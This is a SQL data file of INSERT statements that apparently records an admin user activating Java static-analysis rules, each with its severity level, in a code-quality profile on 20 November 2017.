INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1524, '2017-11-20 11:00:15.817', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1174;ruleKey=squid:S1174;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfVJbbGRdfPp-q1X');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1525, '2017-11-20 11:00:15.88', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1175;ruleKey=squid:S1175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfWIbbGRdfPp-q1Y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1526, '2017-11-20 11:00:15.921', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1181;ruleKey=squid:S1181;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfWxbbGRdfPp-q1Z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1527, '2017-11-20 11:00:15.972', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1182;ruleKey=squid:S1182;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfXkbbGRdfPp-q1a');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1528, '2017-11-20 11:00:16.032', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1185;ruleKey=squid:S1185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfYgbbGRdfPp-q1b');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1529, '2017-11-20 11:00:16.109', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1186;ruleKey=squid:S1186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfZtbbGRdfPp-q1c');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1530, '2017-11-20 11:00:16.134', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1190;ruleKey=squid:S1190;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfaGbbGRdfPp-q1d');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1531, '2017-11-20 11:00:16.168', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1191;ruleKey=squid:S1191;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;param_Exclude=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfaobbGRdfPp-q1e');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1532, '2017-11-20 11:00:16.193', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1192;ruleKey=squid:S1192;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;param_threshold=3;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfbBbbGRdfPp-q1f');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1533, '2017-11-20 11:00:16.251', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1193;ruleKey=squid:S1193;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfb7bbGRdfPp-q1g');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1534, '2017-11-20 11:00:16.279', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1195;ruleKey=squid:S1195;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfcXbbGRdfPp-q1h');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1535, '2017-11-20 11:00:16.319', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1197;ruleKey=squid:S1197;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfc_bbGRdfPp-q1i');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1536, '2017-11-20 11:00:16.351', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1199;ruleKey=squid:S1199;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfdfbbGRdfPp-q1j');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1537, '2017-11-20 11:00:16.382', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1201;ruleKey=squid:S1201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfd-bbGRdfPp-q1k');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1538, '2017-11-20 11:00:16.399', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1206;ruleKey=squid:S1206;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfePbbGRdfPp-q1l');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1539, '2017-11-20 11:00:16.425', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1210;ruleKey=squid:S1210;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfepbbGRdfPp-q1m');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1540, '2017-11-20 11:00:16.446', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1214;ruleKey=squid:S1214;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfe-bbGRdfPp-q1n');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1541, '2017-11-20 11:00:16.471', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1215;ruleKey=squid:S1215;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFffXbbGRdfPp-q1o');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1542, '2017-11-20 11:00:16.5', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1217;ruleKey=squid:S1217;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFff0bbGRdfPp-q1p');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1543, '2017-11-20 11:00:16.532', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1219;ruleKey=squid:S1219;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfgUbbGRdfPp-q1q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1544, '2017-11-20 11:00:16.577', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1220;ruleKey=squid:S1220;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfhBbbGRdfPp-q1r');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1545, '2017-11-20 11:00:16.622', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1221;ruleKey=squid:S1221;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfhubbGRdfPp-q1s');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1546, '2017-11-20 11:00:16.662', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1223;ruleKey=squid:S1223;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfiWbbGRdfPp-q1t');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1547, '2017-11-20 11:00:16.697', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1226;ruleKey=squid:S1226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfi5bbGRdfPp-q1u');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1548, '2017-11-20 11:00:16.726', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1264;ruleKey=squid:S1264;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfjWbbGRdfPp-q1v');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1549, '2017-11-20 11:00:16.756', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S128;ruleKey=squid:S128;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfj0bbGRdfPp-q1w');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1550, '2017-11-20 11:00:16.773', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1301;ruleKey=squid:S1301;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfkFbbGRdfPp-q1x');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1551, '2017-11-20 11:00:16.805', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1313;ruleKey=squid:S1313;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfklbbGRdfPp-q1y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1552, '2017-11-20 11:00:16.84', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1317;ruleKey=squid:S1317;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFflIbbGRdfPp-q1z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1553, '2017-11-20 11:00:16.872', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1319;ruleKey=squid:S1319;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFflobbGRdfPp-q10');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1554, '2017-11-20 11:00:16.89', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S135;ruleKey=squid:S135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfl6bbGRdfPp-q11');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1555, '2017-11-20 11:00:16.931', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1444;ruleKey=squid:S1444;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfmjbbGRdfPp-q12');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1556, '2017-11-20 11:00:17.053', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1450;ruleKey=squid:S1450;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfodbbGRdfPp-q13');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1557, '2017-11-20 11:00:17.139', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1452;ruleKey=squid:S1452;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfpzbbGRdfPp-q14');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1558, '2017-11-20 11:00:17.274', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1479;ruleKey=squid:S1479;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;param_maximum=30;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfr6bbGRdfPp-q15');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1559, '2017-11-20 11:00:17.34', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1481;ruleKey=squid:S1481;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfs8bbGRdfPp-q16');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1560, '2017-11-20 11:00:17.372', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1488;ruleKey=squid:S1488;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFftcbbGRdfPp-q17');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1561, '2017-11-20 11:00:17.417', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1596;ruleKey=squid:S1596;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfuJbbGRdfPp-q18');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1562, '2017-11-20 11:00:17.468', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1598;ruleKey=squid:S1598;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfu8bbGRdfPp-q19');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1563, '2017-11-20 11:00:17.513', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1602;ruleKey=squid:S1602;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfvpbbGRdfPp-q1-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1564, '2017-11-20 11:00:17.56', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1604;ruleKey=squid:S1604;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfwYbbGRdfPp-q1_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1565, '2017-11-20 11:00:17.607', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1607;ruleKey=squid:S1607;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfxHbbGRdfPp-q2A');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1566, '2017-11-20 11:00:17.635', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1610;ruleKey=squid:S1610;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfxjbbGRdfPp-q2B');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1567, '2017-11-20 11:00:17.674', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1611;ruleKey=squid:S1611;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfyKbbGRdfPp-q2C');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1568, '2017-11-20 11:00:17.705', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1612;ruleKey=squid:S1612;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfypbbGRdfPp-q2D');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1569, '2017-11-20 11:00:17.753', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1640;ruleKey=squid:S1640;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFfzZbbGRdfPp-q2E');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1570, '2017-11-20 11:00:17.831', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1643;ruleKey=squid:S1643;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFf0nbbGRdfPp-q2F');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1571, '2017-11-20 11:00:17.875', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1656;ruleKey=squid:S1656;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFf1TbbGRdfPp-q2G');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1572, '2017-11-20 11:00:17.951', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1659;ruleKey=squid:S1659;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFf2fbbGRdfPp-q2H');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1573, '2017-11-20 11:00:18.011', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1700;ruleKey=squid:S1700;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFf3bbbGRdfPp-q2I');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1574, '2017-11-20 11:00:18.046', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1710;ruleKey=squid:S1710;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFf3-bbGRdfPp-q2J');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1575, '2017-11-20 11:00:18.098', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1751;ruleKey=squid:S1751;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFf4xbbGRdfPp-q2K');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1576, '2017-11-20 11:00:18.138', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1764;ruleKey=squid:S1764;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFf5abbGRdfPp-q2L');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1577, '2017-11-20 11:00:18.185', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1844;ruleKey=squid:S1844;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFf6JbbGRdfPp-q2M');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1578, '2017-11-20 11:00:18.222', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1845;ruleKey=squid:S1845;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFf6ubbGRdfPp-q2N');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1579, '2017-11-20 11:00:18.259', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1849;ruleKey=squid:S1849;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFf7TbbGRdfPp-q2O');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1580, '2017-11-20 11:00:18.294', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1854;ruleKey=squid:S1854;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFf72bbGRdfPp-q2P');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1581, '2017-11-20 11:00:18.333', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1858;ruleKey=squid:S1858;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFf8cbbGRdfPp-q2Q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1582, '2017-11-20 11:00:18.375', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1860;ruleKey=squid:S1860;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFf9HbbGRdfPp-q2R');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1583, '2017-11-20 11:00:18.446', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1862;ruleKey=squid:S1862;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFf-ObbGRdfPp-q2S');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1584, '2017-11-20 11:00:18.484', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1871;ruleKey=squid:S1871;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFf-0bbGRdfPp-q2T');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1585, '2017-11-20 11:00:18.519', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1872;ruleKey=squid:S1872;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFf_XbbGRdfPp-q2U');
